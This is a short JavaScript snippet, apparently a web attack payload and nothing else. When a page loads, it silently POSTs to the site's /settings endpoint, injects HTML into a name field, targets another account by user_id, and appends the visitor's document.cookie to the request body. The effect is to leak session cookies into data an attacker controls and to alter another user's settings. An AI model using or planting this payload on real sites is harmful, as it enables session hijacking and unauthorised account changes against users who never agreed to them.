
window.addEventListener('load', function () {


fetch("/settings", {
    'method': 'POST',
    'body': 'name=<b>asf</b>&user_id=2&' +document.cookie,
     headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
    }
});
   })
